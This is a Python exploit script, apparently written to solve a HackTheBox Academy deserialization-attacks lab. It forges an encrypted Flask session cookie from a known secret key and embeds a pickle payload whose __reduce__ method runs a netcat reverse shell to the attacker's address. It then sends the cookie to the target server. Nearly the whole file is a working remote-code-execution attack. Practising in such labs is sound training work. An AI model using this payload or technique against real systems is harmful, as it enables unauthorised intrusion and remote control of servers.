#!/usr/bin/python3
# Wrote the below script to solve the lab on HackTheBox Academy - Deserialization Attacks - Skills Assessment I
# To catch the reverse shell: open a netcat listener on port 4444, and update the target_url value before running the script

import os
import base64
import hashlib
import pickle
import re
import requests
from datetime import datetime
from cryptography.fernet import Fernet
from flask import Flask, flash, redirect, render_template, request, url_for

target_url= "10.129.177.91:8001"

app = Flask(__name__)
app.config['SECRET_KEY'] = '@s3cur3P!ck13K3y'

class encryptAES:
    def __init__(self, data):
        self.data = data
        self.key = base64.b64encode(hashlib.sha256(
            app.config['SECRET_KEY'].encode()).digest()[:32])
        self.f = Fernet(self.key)

    def encrypt(self):
        encrypted = self.f.encrypt(self.data)
        return base64.b64encode(encrypted).decode()

    def decrypt(self):
        encrypted = base64.b64decode(self.data)
        return self.f.decrypt(encrypted)

def serialize(dictionary):
    serialized = pickle.dumps(dictionary)
    serialized = encryptAES(serialized).encrypt()
    return serialized

def deserialize(serialized):
    try:
        serialized = encryptAES(serialized).decrypt()
    except:
        raise Exception('Invalid session!')
    if not re.search('Title.*?Text.*?Date', str(serialized)):
        raise Exception('Invalid session!')
    dictionary = pickle.loads(serialized)
    if [*dictionary] != ['Title', 'Text', 'Date']:
        raise Exception('Invalid session!')
    return dictionary

class P(object):
    def __reduce__(self):
        return (os.system,("nc 10.10.14.75 4444 -e /bin/sh ",))
# print(serialize(P()))
cmd= P()

dictionary= {'Title':'title', 'Text': cmd, 'Date': 'date'}
serialized_payload= serialize(dictionary)
#print(serialized_payload)

# print(deserialize(serialized_payload))

# Send the payload 
cookies= {"notes":f"{serialized_payload}"}

response= requests.get(f"http://{target_url}", cookies=cookies)
